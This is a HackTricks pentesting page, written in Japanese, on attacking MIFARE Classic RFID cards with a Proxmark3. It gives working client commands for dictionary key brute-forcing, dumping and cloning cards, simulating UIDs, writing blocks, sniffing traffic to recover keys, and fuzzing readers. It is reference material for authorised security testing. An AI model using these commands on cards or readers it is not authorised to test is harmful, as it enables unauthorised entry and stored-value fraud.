# Proxmark 3

{{#include ../../banners/hacktricks-training.md}}

## Proxmark3を使ったRFIDシステムへの攻撃

積極的にメンテナンスされているRRG/Iceman Proxmark3 clientと対応するfirmwareをインストールします。以下に示す古いコマンドは変更されている可能性があるため、そのビルドでコマンドの構文を確認してください。<sup>[[1]](#references)[[5]](#references)</sup>

### MIFARE Classic 1KBへの攻撃

MIFARE Classic 1Kは**16個のsector**で構成され、各sectorには**16バイトのblock**が**4個**あります。Manufacturer block 0にはUID/manufacturer dataが含まれており、本物のNXPカードでは読み取り専用です。特殊なcloneカードや「magic」カードでは、書き換えが可能な場合があります。<sup>[[1]](#references)[[2]](#references)</sup>\
各sectorにアクセスするには**2つのkey**（**A**と**B**）が必要です。これらは各sectorの**block 3**（sector trailer）に保存されています。sector trailerには**access bits**も保存されており、2つのkeyを使って**各block**の**読み取りと書き込み**の権限を設定できます。\
たとえば、1つ目のkeyがわかっていれば読み取り、2つ目のkeyがわかっていれば書き込みを許可する、といった設定に2つのkeyを利用できます。

いくつかの攻撃を実行できます。

```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```

Proxmark3では、機密データを見つけるために、**Tag to Reader communication**を**盗聴**するなど、ほかの操作も実行できます。このカードでは、通信をスニッフィングするだけで、使用された鍵を計算できます。これは、使用されている**暗号処理が弱く**、平文と暗号文が分かれば鍵を計算できるためです（`mfkey64`ツール）。<sup>[[3]](#references)</sup>

#### MiFare Classic quick workflow for stored-value abuse

鍵の復元、残高の差分比較、完全性フィールドの操作、UIDクローン作成の手順（Proxmark3のクライアント出力とmagic cardの制限を含む）については、[MiFare Classic offline stored-value tampering](pentesting-rfid.md#mifare-classic-offline-stored-value-tampering-broken-crypto1)を参照してください。

### Raw Commands

IoTシステムでは、**ブランド名のないタグや市販されていないタグ**が使われることがあります。この場合、Proxmark3を使って、タグにカスタム**raw commands**を送信できます。

```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
  proprietary non iso14443-4 card found, RATS not supported
  No chinese magic backdoor command detected
  Prng detection: WEAK
  Valid ISO14443A Tag Found - Quitting Search
```

この情報を使って、カードに関する情報やカードとの通信方法を調べることができます。Proxmark3では、次のような raw コマンドを送信できます: `hf 14a raw -p -b 7 26`

### Scripts

Proxmark3のソフトウェアには、簡単なタスクを実行するための**自動化スクリプト**があらかじめ用意されています。全リストを取得するには、`script list`コマンドを使用します。次に、`script run`コマンドに続けてスクリプト名を指定します:

```
proxmark3> script run mfkeys
```

タグリーダーを**fuzz**するスクリプトを作成できます。**有効なカード**のデータをコピーし、1つ以上のランダムな**byte**を**ランダム化**する**Lua script**を書いて、各反復で**リーダーがクラッシュするか**確認するだけです。

## References

- [1] [Proxmark3 wiki: HF MIFARE](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Mifare)
- [2] [Proxmark3 wiki: HF Magicカード](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Magic-cards)
- [3] [MIFARE Classic Crypto1に関するNXPの声明](https://www.mifare.net/en/products/chip-card-ics/mifare-classic/security-statement-on-crypto1-implementations/)
- [4] [KioSoft Stored ValueにおけるNFCカードの脆弱性悪用（SEC Consult）](https://sec-consult.com/vulnerability-lab/advisory/nfc-card-vulnerability-exploitation-leading-to-free-top-up-kiosoft-payment-solution/)
- [5] [RRG/Iceman Proxmark3 — Linuxへのインストール](https://github.com/RfidResearchGroup/proxmark3/blob/master/doc/md/Installation_Instructions/Linux-Installation-Instructions.md)
{{#include ../../banners/hacktricks-training.md}}
